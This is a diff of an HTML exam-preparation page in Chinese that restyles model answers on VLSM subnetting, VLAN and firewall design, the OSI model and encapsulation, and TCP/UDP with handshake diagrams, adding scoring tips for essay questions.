@@ -872,8 +872,12 @@
   <div class="card">
     <h2>✍️ 第二部分：申論題（14 題）</h2>
     <div class="hl">
-      本科申論有兩種題型：<strong>計算題</strong>（子網路切割）與<strong>情境論述題</strong>（資安規劃）。<br>
-      計算題務必寫出完整過程；論述題務必用「分層」結構。每題限時 25 分鐘。
+      <span class="t">📐 解答格式（圖表為主、文字精簡）</span>
+      每題解答分三塊：<br>
+      <strong>📋 答題骨架</strong>——照抄到答案卷上的標題順序<br>
+      <strong>📊 主表／圖</strong>——內容主體，能畫表就不要寫成段落<br>
+      <strong>✍️ 必寫拿分點</strong>——沒寫到就會被扣的關鍵句<br><br>
+      每題請<strong>限時 25 分鐘手寫</strong>；計算題務必<strong>列出過程並驗算</strong>。
     </div>
   </div>
 
@@ -887,56 +891,77 @@
       (二) 說明 VLSM 相對於固定長度子網路切割（FLSM）的優點。（5 分）<br>
       (三) 說明此網路架構在資安上應如何搭配 VLAN 與防火牆設計。（5 分）
     </div>
-    <details><summary>看答題架構與解答</summary>
+    <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">參考解答</span>
-        <strong>一、VLSM 規劃</strong><br><br>
-        <strong>步驟 1：需求由大到小排序</strong>（VLSM 的關鍵前提）<br>
-        業務科 60 → 行政科 28 → 政風室 12 → 資訊室 5 → 路由器 2<br><br>
-        <strong>步驟 2：決定各子網路遮罩</strong><br>
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、<u>由大到小排序＋遮罩判定表</u> → 二、<u>配置表（四欄齊全）</u>＋驗算 → 三、VLSM vs FLSM（表）→ 四、VLAN 與防火牆設計（表）
+        </div>
+
+        <strong>📊 一、由大到小排序並決定遮罩</strong>
         <div class="table-wrap"><table>
-          <tr><th>單位</th><th>需求</th><th>計算</th><th>CIDR</th><th>可用數</th><th>區塊</th></tr>
-          <tr><td>業務科</td><td>60</td><td>2⁶−2 = 62 ≥ 60</td><td>/26</td><td>62</td><td>64</td></tr>
-          <tr><td>行政科</td><td>28</td><td>2⁵−2 = 30 ≥ 28</td><td>/27</td><td>30</td><td>32</td></tr>
-          <tr><td>政風室</td><td>12</td><td>2⁴−2 = 14 ≥ 12</td><td>/28</td><td>14</td><td>16</td></tr>
-          <tr><td>資訊室</td><td>5</td><td>2³−2 = 6 ≥ 5</td><td>/29</td><td>6</td><td>8</td></tr>
-          <tr><td>路由器</td><td>2</td><td>2²−2 = 2</td><td>/30</td><td>2</td><td>4</td></tr>
+          <tr><th>單位</th><th>需求</th><th>計算</th><th>CIDR</th><th>可用主機</th><th>區塊大小</th></tr>
+          <tr><td>業務科</td><td>60</td><td>2⁶−2 = 62 ≥ 60</td><td><strong>/26</strong></td><td>62</td><td>64</td></tr>
+          <tr><td>行政科</td><td>28</td><td>2⁵−2 = 30 ≥ 28</td><td><strong>/27</strong></td><td>30</td><td>32</td></tr>
+          <tr><td>政風室</td><td>12</td><td>2⁴−2 = 14 ≥ 12</td><td><strong>/28</strong></td><td>14</td><td>16</td></tr>
+          <tr><td>資訊室</td><td>5</td><td>2³−2 = 6 ≥ 5</td><td><strong>/29</strong></td><td>6</td><td>8</td></tr>
+          <tr><td>路由器連線</td><td>2</td><td>2²−2 = 2</td><td><strong>/30</strong></td><td>2</td><td>4</td></tr>
         </table></div>
-        <strong>步驟 3：由大到小依序配置</strong><br>
+        <div class="frame">
+          <span class="t">📐 判定公式</span>
+          可用主機數 = <strong>2^(主機位元) − 2</strong>（扣掉網路位址與廣播位址）<br>
+          解法：把「需求 + 2」往上取最接近的 2 的次方，即得主機位元數。<br>
+          例：60 + 2 = 62 → 最接近且不小於它的是 <strong>64 = 2⁶</strong> → 主機位元 6 → 前綴 32 − 6 = <strong>/26</strong>
+        </div>
+
+        <strong>📊 二、配置結果</strong>
         <div class="table-wrap"><table>
           <tr><th>單位</th><th>網路位址</th><th>可用範圍</th><th>廣播位址</th><th>子網路遮罩</th></tr>
-          <tr><td>業務科</td><td>192.168.100.0/26</td><td>.1 – .62</td><td>.63</td><td>255.255.255.192</td></tr>
-          <tr><td>行政科</td><td>192.168.100.64/27</td><td>.65 – .94</td><td>.95</td><td>255.255.255.224</td></tr>
-          <tr><td>政風室</td><td>192.168.100.96/28</td><td>.97 – .110</td><td>.111</td><td>255.255.255.240</td></tr>
-          <tr><td>資訊室</td><td>192.168.100.112/29</td><td>.113 – .118</td><td>.119</td><td>255.255.255.248</td></tr>
-          <tr><td>路由器</td><td>192.168.100.120/30</td><td>.121 – .122</td><td>.123</td><td>255.255.255.252</td></tr>
+          <tr><td>業務科</td><td>192.168.100.<strong>0</strong>/26</td><td>.1 – .62</td><td>.63</td><td>255.255.255.192</td></tr>
+          <tr><td>行政科</td><td>192.168.100.<strong>64</strong>/27</td><td>.65 – .94</td><td>.95</td><td>255.255.255.224</td></tr>
+          <tr><td>政風室</td><td>192.168.100.<strong>96</strong>/28</td><td>.97 – .110</td><td>.111</td><td>255.255.255.240</td></tr>
+          <tr><td>資訊室</td><td>192.168.100.<strong>112</strong>/29</td><td>.113 – .118</td><td>.119</td><td>255.255.255.248</td></tr>
+          <tr><td>路由器連線</td><td>192.168.100.<strong>120</strong>/30</td><td>.121 – .122</td><td>.123</td><td>255.255.255.252</td></tr>
+          <tr><td colspan="5">剩餘 .124 – .255（<strong>132 個位址</strong>）保留供未來擴充</td></tr>
         </table></div>
-        <strong>驗算</strong>：64 + 32 + 16 + 8 + 4 = <strong>124 個位址</strong>，未超過 256；<br>
-        剩餘 192.168.100.124 – .255（共 132 個位址）<strong>保留供未來擴充</strong>。<br><br>
-        <strong>二、VLSM 相對 FLSM 之優點</strong><br>
-        　（一）<strong>位址使用效率高</strong>：<br>
-        　　　若採 FLSM，須以最大需求（60 台）為準，全部使用 /26 → 5 個單位需 5×64 = 320 個位址，<strong>超出 /24 的 256 個，根本不夠用</strong>。<br>
-        　　　採 VLSM 僅需 124 個，效率提升逾一倍。<br>
-        　（二）<strong>符合實際需求</strong>：小單位不必浪費大區塊（如路由器對接只需 2 個位址）。<br>
-        　（三）<strong>保留擴充彈性</strong>：省下的位址可供未來新增單位或設備使用。<br>
-        　（四）<strong>配合路由聚合</strong>：連續配置有利於後續彙總路由，縮小繞送表。<br>
-        　（五）<strong>限制</strong>：需路由協定支援（RIPv2、OSPF、EIGRP 支援；RIPv1 不支援，因其不傳送遮罩資訊）。<br><br>
-        <strong>三、資安設計建議</strong><br>
-        　（一）<strong>每個子網路對應一個 VLAN</strong>，達成 L2 廣播網域隔離<br>
-        　（二）VLAN 間流量須經 L3 設備並套用 <strong>ACL</strong>，落實<strong>最小權限</strong>：<br>
-        　　　‧ 政風室、資訊室屬敏感單位，應限制其他單位主動連入<br>
-        　　　‧ 業務科與行政科僅開放存取應用系統的必要埠<br>
-        　　　‧ <strong>伺服器區應獨立於使用者網段</strong>，並限制管理埠（SSH 22、RDP 3389）僅由管理網段存取<br>
-        　（三）另建議增設之網段（超出題目但為加分點）：<br>
-        　　　‧ <strong>DMZ</strong>：對外服務（網站、郵件）獨立於內網<br>
-        　　　‧ <strong>訪客 Wi-Fi</strong>：完全隔離，僅允許上網<br>
-        　　　‧ <strong>IoT／監視設備網段</strong>：此類設備常有預設密碼與韌體漏洞，須獨立隔離<br>
-        　　　‧ <strong>管理網段（Out-of-band）</strong>：設備管理介面不與業務流量混用<br>
-        　（四）防火牆採<strong>預設拒絕</strong>原則，並<strong>雙向管控</strong>（出向流量可阻斷 C2 連線與資料竊出）<br>
-        　（五）依《資通安全管理法》應保留連線日誌，並以 SIEM 集中監控異常<br><br>
-        <strong>四、結論</strong>：本規劃以 VLSM 提高位址使用效率，並以 VLAN 與 ACL 落實網段隔離；惟位址規劃應預留擴充空間，並配合機關組織調整定期檢討。
+        <div class="hl"><strong>驗算</strong>：64 + 32 + 16 + 8 + 4 = <strong>124</strong> ≤ 256 ✔　各段起點皆為其區塊大小的倍數 ✔</div>
+
+        <strong>📊 三、VLSM vs FLSM</strong>
+        <div class="table-wrap"><table>
+          <tr><th>比較點</th><th>FLSM（固定長度）</th><th>VLSM（可變長度）</th></tr>
+          <tr><td>遮罩</td><td>全部子網路<strong>相同</strong></td><td>依需求<strong>各自不同</strong></td></tr>
+          <tr><td>本題若用 FLSM</td><td>須遷就最大需求（60 台）→ 全部用 /26，5 段共需 <strong>320 個位址 &gt; 256</strong> → <u>根本不夠</u></td><td>僅用 124 個位址即滿足全部需求</td></tr>
+          <tr><td><strong>位址使用效率</strong></td><td>低（小單位嚴重浪費）</td><td><strong>高</strong></td></tr>
+          <tr><td>擴充彈性</td><td>差</td><td><strong>好</strong>（可保留連續區段）</td></tr>
+          <tr><td>路由</td><td>可用 RIPv1 等傳統協定</td><td>須支援<strong>無級別路由（CIDR）</strong>之協定：RIPv2、OSPF、EIGRP</td></tr>
+          <tr><td>設定複雜度</td><td>簡單</td><td>較複雜，須妥善規劃避免重疊</td></tr>
+        </table></div>
+        <div class="hl"><strong>一句話結論：本題若採 FLSM 根本無解（需 320 &gt; 256 個位址），VLSM 是唯一可行方案。</strong>——寫出這個對比最能拿分。</div>
+
+        <strong>📊 四、VLAN 與防火牆設計</strong>
+        <div class="table-wrap"><table>
+          <tr><th>網段</th><th>VLAN</th><th>防火牆政策</th></tr>
+          <tr><td>業務科、行政科</td><td>各自獨立 VLAN</td><td>可存取伺服器之<strong>應用埠</strong>；<u>不得直接連資料庫埠</u>；上網經內容過濾</td></tr>
+          <tr><td><strong>政風室</strong></td><td>獨立 VLAN</td><td>業務具敏感性 → <strong>其他單位不得存取政風室網段</strong>；出向流量另行記錄</td></tr>
+          <tr><td><strong>資訊室伺服器</strong></td><td>獨立 VLAN（等同 DMZ 內側）</td><td>僅開放必要服務埠；<strong>管理埠（SSH 22／RDP 3389）僅限管理端或跳板機</strong></td></tr>
+          <tr><td>對外服務</td><td><strong>DMZ</strong></td><td>對外網站與郵件置於 DMZ；<strong>DMZ 主機不得主動連入內網</strong></td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>通用原則</th><th>說明</th></tr>
+          <tr><td><strong>預設拒絕</strong>（Default Deny）</td><td>先全部封鎖，再逐條開放必要通訊</td></tr>
+          <tr><td><strong>雙向管控</strong></td><td>不只管進來，<strong>出向流量也要管</strong>——阻斷惡意程式回連 C2</td></tr>
+          <tr><td>VLAN 間繞送</td><td>經 L3 交換器或防火牆，並套用 <strong>ACL</strong>；不可讓 VLAN 間直接互通</td></tr>
+          <tr><td><strong>網路存取控制（NAC）</strong></td><td>802.1X 認證，未授權設備不得接入</td></tr>
+          <tr><td>監控</td><td>日誌集中（SIEM）、異常告警；依《資通安全管理法》納入資通安全維護計畫</td></tr>
+        </table></div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. <strong>一定要先由大到小排序</strong>——沒排序是本題最大扣分點<br>
+        2. 寫出<strong>可用主機數公式 2^n − 2</strong> 及扣 2 的理由<br>
+        3. 配置表<strong>四欄齊全</strong>（網路位址／可用範圍／廣播／遮罩），遮罩要寫十進位點分式<br>
+        4. <strong>務必驗算</strong>（總和 124 ≤ 256）並說明保留擴充<br>
+        5. 第二小題要<strong>用本題數字對比</strong>（FLSM 需 320 個位址 → 不可行）<br>
+        6. 資安段要有<strong>預設拒絕</strong>、<strong>雙向管控</strong>、<strong>管理埠限跳板機</strong>、<strong>DMZ 不得主動連入內網</strong>
         </div>
-        <strong>💡 拿分關鍵</strong>：(1) <strong>一定要先排序</strong>——沒排序就配置是最常見的扣分點；(2) 每一列的四個欄位（網路位址／可用範圍／廣播／遮罩）都要寫齊；(3) <strong>要驗算</strong>；(4) 第三小題的網段隔離建議能把分數從 18 拉到 23。
       </div>
     </details>
   </div>
@@ -950,43 +975,75 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、OSI 七層模型</strong>（表格：層級／名稱／功能／資料單位／代表協定）<br>
-        　由上而下：應用、表達、會議、傳輸、網路、資料連結、實體<br>
-        　各層一句話定位：<br>
-        　（一）應用層：使用者服務介面（HTTP、SMTP、DNS）<br>
-        　（二）表達層：格式轉換、<strong>加密解密</strong>、壓縮<br>
-        　（三）會議層：對話建立與管理<br>
-        　（四）傳輸層：<strong>端對端</strong>可靠傳輸、埠號（TCP、UDP）<br>
-        　（五）網路層：<strong>邏輯定址與繞送</strong>（IP、路由器）<br>
-        　（六）資料連結層：<strong>實體定址、錯誤偵測</strong>（Ethernet、交換器）<br>
-        　（七）實體層：位元的電氣／光學傳輸<br>
-        　補充：OSI 為<strong>參考模型</strong>，TCP/IP 四層為<strong>實際實作</strong>，並列出兩者對應表<br><br>
-        <strong>二、封裝過程</strong><br>
-        　（一）逐層加上標頭：<br>
-        　　　Data → ＋TCP 標頭 = <strong>Segment</strong> → ＋IP 標頭 = <strong>Packet</strong> → ＋Frame 標頭與 FCS = <strong>Frame</strong> → 轉為 <strong>Bits</strong><br>
-        　（二）畫圖示意（<u>務必畫</u>）<br>
-        　（三）接收端反向<strong>解封裝（De-encapsulation）</strong><br>
-        　（四）意義說明：<br>
-        　　　1. 每層僅處理自己的標頭，實現<strong>分層獨立</strong><br>
-        　　　2. 中介設備只需拆到必要層級——<strong>交換器拆到 L2、路由器拆到 L3</strong>，故交換器處理速度較快<br>
-        　　　3. 分層使技術可各自演進（如有線換無線，上層完全不受影響）<br><br>
-        <strong>三、網路設備比較</strong><br>
-        　（一）表格：設備／工作層級／轉送依據／碰撞網域／廣播網域<br>
-        <div class="table-wrap"><table>
-          <tr><th>設備</th><th>層級</th><th>依據</th><th>碰撞網域</th><th>廣播網域</th></tr>
-          <tr><td>集線器</td><td>L1</td><td>無（廣播）</td><td>全部共用 1 個</td><td>1 個</td></tr>
-          <tr><td>交換器</td><td>L2</td><td>MAC 表</td><td><strong>每埠 1 個</strong></td><td>1 個（未切 VLAN）</td></tr>
-          <tr><td>路由器</td><td>L3</td><td>繞送表</td><td>每介面 1 個</td><td><strong>每介面 1 個</strong></td></tr>
-        </table></div>
-        　（二）名詞定義：<br>
-        　　　‧ <strong>碰撞網域</strong>：共享傳輸媒介、封包會互相碰撞的範圍<br>
-        　　　‧ <strong>廣播網域</strong>：廣播封包可到達的範圍<br>
-        　（三）關鍵結論：<strong>交換器分割碰撞網域、路由器分割廣播網域</strong>；交換器須設定 <strong>VLAN</strong> 方能分割廣播網域<br>
-        　（四）實務意義：廣播網域過大會造成廣播流量占用頻寬與資安風險（ARP 欺騙範圍擴大），故機關網路應以 VLAN 適度切分<br><br>
-        <strong>四、結論</strong>：分層架構為網路設計之基礎；理解各層職責有助於設備選型、疑難排解與資安防護規劃（各層皆有對應之攻擊與防禦手段）。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、七層功能表（含資料單位）→ 二、<u>封裝流程圖</u>＋解封裝 → 三、三種設備比較表＋碰撞／廣播網域圖
         </div>
-        <strong>💡 拿分關鍵</strong>：封裝過程<strong>要畫圖</strong>。第三小題的表格若能把「碰撞網域／廣播網域」欄位填出來，就已經勝過大多數考生。
+
+        <strong>📊 一、OSI 七層</strong>
+        <div class="table-wrap"><table>
+          <tr><th>層</th><th>名稱</th><th>功能</th><th>資料單位</th><th>代表協定／設備</th></tr>
+          <tr><td>7</td><td>應用層</td><td>提供使用者服務介面</td><td>Data</td><td>HTTP、FTP、SMTP、DNS、SNMP</td></tr>
+          <tr><td>6</td><td>表達層</td><td>格式轉換、<strong>加密／解密</strong>、壓縮</td><td>Data</td><td>JPEG、MPEG、ASCII、SSL/TLS（部分歸此層）</td></tr>
+          <tr><td>5</td><td>會議層</td><td>對話建立、管理、同步與中止</td><td>Data</td><td>NetBIOS、RPC、SQL 會話</td></tr>
+          <tr><td>4</td><td>傳輸層</td><td><strong>端對端可靠傳輸、埠號、分段與重組、流量控制</strong></td><td><strong>Segment</strong></td><td>TCP、UDP</td></tr>
+          <tr><td>3</td><td>網路層</td><td><strong>邏輯定址（IP）、路徑選擇與繞送</strong></td><td><strong>Packet</strong></td><td>IP、ICMP、ARP<sup>※</sup>、OSPF／<strong>路由器</strong></td></tr>
+          <tr><td>2</td><td>資料連結層</td><td><strong>實體定址（MAC）、框架化、錯誤偵測、媒介存取控制</strong></td><td><strong>Frame</strong></td><td>Ethernet、PPP、802.11／<strong>交換器、橋接器</strong></td></tr>
+          <tr><td>1</td><td>實體層</td><td>位元的電氣、機械與訊號傳輸</td><td><strong>Bit</strong></td><td>雙絞線、光纖、RJ-45／<strong>集線器、中繼器</strong></td></tr>
+        </table></div>
+        <p style="font-size:.85rem">※ ARP 介於 L2 與 L3 之間，一般歸為 L2/L3 之間的協定。<br>
+        <strong>口訣（由上而下）：應、表、會、傳、網、資、實。</strong></p>
+
+        <strong>📊 二、封裝過程</strong>
+        <pre>【傳送端：由上而下，逐層加標頭】
+
+  L7 應用層     [        Data        ]              使用者資料
+  L6/L5         [        Data        ]              （格式轉換、會話管理）
+  L4 傳輸層  [TCP標頭|      Data      ]  → Segment  加來源／目的【埠號】、序號
+  L3 網路層  [IP標頭|TCP標頭|  Data   ]  → Packet   加來源／目的【IP 位址】、TTL
+  L2 連結層  [Frame標頭|IP|TCP|Data|FCS] → Frame    加來源／目的【MAC】、尾端加 FCS
+  L1 實體層  1010110100111010...        → Bit       轉為電、光或無線訊號
+
+【接收端：由下而上，逐層拆標頭 → 解封裝（Decapsulation）】</pre>
+        <div class="table-wrap"><table>
+          <tr><th>要點</th><th>說明</th></tr>
+          <tr><td>每層只看自己的標頭</td><td>上層資料對本層而言是<strong>不透明的酬載（Payload）</strong></td></tr>
+          <tr><td><strong>MAC 每一段都會改變</strong></td><td>每經一個路由器，<strong>來源／目的 MAC 重寫</strong>為該段的兩端</td></tr>
+          <tr><td><strong>IP 通常維持不變</strong></td><td>來源／目的 IP 由頭到尾不變（<u>除非經過 NAT</u>）</td></tr>
+          <tr><td>MTU 與分片</td><td>封包超過 MTU（乙太網路 1500 bytes）須<strong>分片</strong>；IPv6 改由來源端負責</td></tr>
+          <tr><td>FCS</td><td>Frame 尾端的檢查碼，用於<strong>錯誤偵測</strong>（僅偵測，不更正）</td></tr>
+        </table></div>
+
+        <strong>📊 三、三種設備與兩種網域</strong>
+        <div class="table-wrap"><table>
+          <tr><th>設備</th><th>層級</th><th>轉送依據</th><th>碰撞網域</th><th>廣播網域</th><th>特性</th></tr>
+          <tr><td><strong>集線器</strong>（Hub）</td><td>L1</td><td><strong>無</strong>（收到就往所有埠廣播）</td><td>所有埠<strong>共用 1 個</strong></td><td>1 個</td><td>半雙工、頻寬共享、易碰撞；已淘汰</td></tr>
+          <tr><td><strong>交換器</strong>（Switch）</td><td>L2</td><td><strong>MAC 位址表</strong></td><td><strong>每個埠各 1 個</strong></td><td>1 個（未切 VLAN）</td><td>全雙工、頻寬獨享；<strong>可用 VLAN 切分廣播網域</strong></td></tr>
+          <tr><td><strong>路由器</strong>（Router）</td><td>L3</td><td><strong>IP 路由表</strong></td><td>每介面 1 個</td><td><strong>每介面各 1 個</strong></td><td>連接不同網路；<strong>預設不轉送廣播</strong></td></tr>
+        </table></div>
+        <div class="frame">
+          <span class="t">📐 兩個網域的定義</span>
+          <strong>碰撞網域</strong>：<u>同一時間只能有一台設備傳送</u>的範圍。兩台同時傳送即發生碰撞（CSMA/CD）。<br>
+          <strong>廣播網域</strong>：<u>一台設備送出廣播封包時，能收到的所有設備</u>的範圍。<br><br>
+          <strong>核心口訣：交換器分割「碰撞網域」，路由器分割「廣播網域」。</strong><br>
+          （VLAN 則讓 L2 交換器也能分割廣播網域，是 VLAN 最重要的價值。）
+        </div>
+        <pre>  集線器：           交換器：              路由器：
+   ┌─────────┐      ┌──┬──┬──┬──┐      ┌────┬────┐
+   │ 1個碰撞 │      │碰│碰│碰│碰│      │廣播│廣播│
+   │  網域   │      │撞│撞│撞│撞│      │網域│網域│
+   └─────────┘      └──┴──┴──┴──┘      └────┴────┘
+   1 廣播網域         1 廣播網域          每介面各 1 個
+                    （未切 VLAN 時）</pre>
+        <p style="font-size:.88rem"><strong>為何要分割廣播網域</strong>：廣播封包（ARP、DHCP Discover）會送到網域內每一台主機。網域太大時，廣播流量將消耗大量頻寬與 CPU，嚴重時形成<strong>廣播風暴</strong>。</p>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 七層要寫出<strong>資料單位</strong>（Segment／Packet／Frame／Bit）——最常漏且好拿分<br>
+        2. 每層至少舉<strong>兩個代表協定</strong><br>
+        3. 封裝<strong>要畫圖</strong>，並指出<strong>「MAC 逐段改變、IP 全程不變」</strong>——本題最大鑑別點<br>
+        4. 補充<strong>解封裝</strong>與 <strong>MTU 分片</strong><br>
+        5. 設備比較表<strong>務必含碰撞網域與廣播網域兩欄</strong><br>
+        6. 寫出<strong>「交換器分割碰撞網域、路由器分割廣播網域，VLAN 讓交換器也能分割廣播網域」</strong>
+        </div>
       </div>
     </details>
   </div>
@@ -1000,44 +1057,86 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、TCP 與 UDP 之比較</strong><br>
-        　（一）表格比較（連線性／可靠性／順序／流量控制／擁塞控制／標頭大小／速度）<br>
-        　（二）<strong>TCP 應用與原因</strong>：<br>
-        　　　‧ HTTP/HTTPS（網頁）：內容不可缺漏錯亂<br>
-        　　　‧ SMTP／IMAP（郵件）：郵件不可遺失<br>
-        　　　‧ FTP／SSH（檔案與遠端登入）：一個位元錯誤即可能造成檔案損毀<br>
-        　（三）<strong>UDP 應用與原因</strong>：<br>
-        　　　‧ DNS 查詢：單一封包即可完成，交握成本反而高於重送成本<br>
-        　　　‧ VoIP／視訊：<strong>即時性優先</strong>，掉一個封包不如卡頓嚴重<br>
-        　　　‧ 線上遊戲／串流：狀態持續更新，舊封包重送已無意義<br>
-        　（四）關鍵洞察：<strong>TCP 適合「不能錯」，UDP 適合「不能慢」</strong><br>
-        　（五）補充：QUIC（HTTP/3）以 UDP 為基礎<u>在應用層自行實作</u>可靠性與擁塞控制，兼顧兩者優點<br><br>
-        <strong>二、連線建立與終止</strong><br>
-        　（一）三向交握流程圖（SYN → SYN+ACK → ACK，標明 seq 與 ack）<br>
-        　（二）<strong>為何需三次</strong>：<br>
-        　　　1. 連線為<strong>雙向</strong>，兩方向皆須確認可達<br>
-        　　　2. 前兩次僅能確認「用戶端→伺服器」方向；<strong>第三次 ACK 才使伺服器確知對方也收到其回應</strong><br>
-        　　　3. 同時完成雙方<strong>初始序號（ISN）</strong>之交換與同步，避免舊的重複封包造成混亂<br>
-        　（三）四向斷線流程圖（FIN → ACK → FIN → ACK）<br>
-        　（四）<strong>為何需四次</strong>：TCP 為<strong>全雙工</strong>，兩個方向須<u>各自</u>關閉。一方送 FIN 僅表示「我沒有資料要送了」，對方可能仍有資料待傳完，故其 ACK 與 FIN 需分開送出<br>
-        　（五）補充：<strong>TIME_WAIT 狀態</strong>（等待 2MSL）之目的為確保最後的 ACK 送達，並使舊封包在網路中消散<br>
-        　（六）資安連結：<strong>SYN Flood</strong> 即利用半開連線耗盡資源，防護為 SYN Cookie<br><br>
-        <strong>三、流量控制與擁塞控制</strong><br>
-        　（一）<strong>流量控制</strong>：<br>
-        　　　‧ 目的：防止<strong>接收端</strong>緩衝區溢滿<br>
-        　　　‧ 機制：<strong>滑動視窗</strong>，接收端於 ACK 中回報 rwnd<br>
-        　　　‧ 零視窗時發送端暫停，並定期送探測封包<br>
-        　（二）<strong>擁塞控制</strong>：<br>
-        　　　‧ 目的：防止<strong>網路</strong>壅塞<br>
-        　　　‧ 四階段：慢啟動（指數）→ 擁塞避免（線性）→ 快速重送（3 個重複 ACK）→ 快速回復<br>
-        　　　‧ <strong>逾時</strong>：cwnd 歸 1 重新慢啟動；<strong>3 個重複 ACK</strong>：ssthresh 減半、進入快速回復<br>
-        　　　‧ 實際傳送量 = <strong>min(rwnd, cwnd)</strong>（兩者取小）<br>
-        　（三）差異對照表（解決問題／對象／機制／變數）<br>
-        　（四）補充：「慢啟動」名稱易誤導，其成長為<strong>指數</strong>，僅起始量小<br><br>
-        <strong>四、結論</strong>：TCP 以交握、確認、重送與雙重視窗控制達成可靠傳輸，代價為額外負擔與延遲；協定之選擇須依應用對「可靠性」與「即時性」之相對需求決定。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、TCP/UDP 比較表＋應用理由表 → 二、<u>交握與斷線流程圖</u>＋三次／四次的理由 → 三、流量 vs 擁塞控制（表）
         </div>
-        <strong>💡 拿分關鍵</strong>：三向交握與四向斷線<strong>務必畫流程圖</strong>並標出 seq/ack。「為何三次、為何四次」的<u>理由</u>是本題最大的區分點，只畫圖不解釋拿不到高分。能提到 <code>min(rwnd, cwnd)</code> 是明顯加分。
+
+        <strong>📊 一、TCP vs UDP</strong>
+        <div class="table-wrap"><table>
+          <tr><th>比較點</th><th>TCP</th><th>UDP</th></tr>
+          <tr><td>連線</td><td><strong>連線導向</strong>（先交握）</td><td>非連線導向（直接送）</td></tr>
+          <tr><td>可靠性</td><td><strong>可靠</strong>：確認（ACK）、逾時重送、序號排序、去重</td><td>不可靠：不確認、不重送、不排序</td></tr>
+          <tr><td>流量控制</td><td><strong>有</strong>（滑動視窗）</td><td>無</td></tr>
+          <tr><td>擁塞控制</td><td><strong>有</strong></td><td><strong>無</strong>（可能加劇壅塞）</td></tr>
+          <tr><td>標頭大小</td><td>20 bytes 以上</td><td><strong>8 bytes</strong></td></tr>
+          <tr><td>傳輸速度</td><td>較慢（機制開銷大）</td><td><strong>快</strong></td></tr>
+          <tr><td>傳送模式</td><td>一對一</td><td><strong>支援一對多（廣播、群播）</strong></td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>協定</th><th>應用</th><th>原因</th></tr>
+          <tr><td rowspan="3"><strong>TCP</strong><br>（<strong>不能錯</strong>）</td><td><strong>HTTP／HTTPS</strong>（公文系統網頁）</td><td>網頁內容不可缺漏或錯亂</td></tr>
+          <tr><td><strong>SMTP／FTP</strong>（電子公文交換、檔案傳輸）</td><td>公文與檔案不可遺失，須完整送達</td></tr>
+          <tr><td><strong>SSH／資料庫連線</strong></td><td>一個位元錯誤即可能造成指令錯誤或資料損毀</td></tr>
+          <tr><td rowspan="3"><strong>UDP</strong><br>（<strong>不能慢</strong>）</td><td><strong>DNS</strong> 查詢</td><td>單一封包即完成，<strong>建立連線的成本高於重送成本</strong>；失敗直接重問即可</td></tr>
+          <tr><td><strong>VoIP／視訊會議</strong></td><td><strong>即時性優先</strong>——掉一格畫面優於整體卡頓；重送到的舊封包已無播放價值</td></tr>
+          <tr><td><strong>DHCP、SNMP、監視器串流</strong></td><td>DHCP 在取得 IP 前無法建立 TCP 連線；串流資料持續更新</td></tr>
+        </table></div>
+
+        <strong>📊 二、三向交握與四向斷線</strong>
+        <pre>【建立連線：三向交握】
+  用戶端                                    伺服器
+    │──── SYN, seq=x ──────────────────────►│  「我要連線，我的序號是 x」
+    │◄─── SYN+ACK, seq=y, ack=x+1 ─────────│  「好，我的序號 y，確認收到你的 x」
+    │──── ACK, ack=y+1 ────────────────────►│  「確認收到你的 y」
+    │◄═══════ 連線建立（ESTABLISHED）═══════►│
+
+【中止連線：四向斷線】
+  用戶端                                    伺服器
+    │──── FIN ─────────────────────────────►│  「我沒資料要送了」
+    │◄─── ACK ─────────────────────────────│  「知道了」（此時伺服器仍可送資料）
+    │            ── 伺服器把剩餘資料送完 ──   │  ← 半關閉（Half-Close）狀態
+    │◄─── FIN ─────────────────────────────│  「我也送完了」
+    │──── ACK ─────────────────────────────►│  「知道了」
+    │       （用戶端進入 TIME_WAIT 2MSL）     │</pre>
+        <div class="table-wrap"><table>
+          <tr><th>問題</th><th>理由</th></tr>
+          <tr><td><strong>為何建立需三次</strong></td><td>連線是<strong>雙向</strong>的，兩端都須確認「對方收得到我」並<strong>同步初始序號</strong>。<br>前兩次只確認了「用戶端→伺服器」這個方向；<strong>第三次 ACK 才讓伺服器確知用戶端也收到了它的回應</strong>。<br>若只有兩次，<u>延遲抵達的舊 SYN 可能使伺服器建立無效連線並浪費資源</u>。</td></tr>
+          <tr><td><strong>為何斷線需四次</strong></td><td>TCP 為<strong>全雙工</strong>，兩個方向須<u>各自關閉</u>。<br>一方送 FIN 只表示「<strong>我沒資料要送了</strong>」，但<strong>對方可能還有資料尚未傳完</strong>。<br>因此 ACK 與 FIN <strong>不能合併</strong>——先回 ACK 收下，把剩餘資料送完後再送自己的 FIN。</td></tr>
+          <tr><td>TIME_WAIT 的作用</td><td>等待 <strong>2MSL</strong>：① 確保最後的 ACK 送達（若遺失可重送）② 讓網路中殘留的舊封包消散，避免影響新連線</td></tr>
+        </table></div>
+        <div class="warn"><span class="t">⚠️ 補充：SYN Flood 攻擊</span>
+        攻擊者大量送出 SYN 但<strong>不回第三次 ACK</strong>，使伺服器的<strong>半開連線佇列</strong>被塞滿而無法服務正常使用者。<br>
+        <strong>防禦</strong>：<strong>SYN Cookie</strong>（不預先配置資源）、縮短逾時、增加佇列長度、部署防護設備。<u>寫出這一段是明顯加分。</u></div>
+
+        <strong>📊 三、流量控制 vs 擁塞控制</strong>
+        <div class="table-wrap"><table>
+          <tr><th>比較點</th><th>流量控制（Flow Control）</th><th>擁塞控制（Congestion Control）</th></tr>
+          <tr><td><strong>解決的問題</strong></td><td><strong>接收端來不及處理</strong></td><td><strong>網路中間壅塞</strong>（路由器緩衝區滿）</td></tr>
+          <tr><td>對象</td><td><strong>端對端</strong>（兩端之間）</td><td><strong>對整個網路</strong></td></tr>
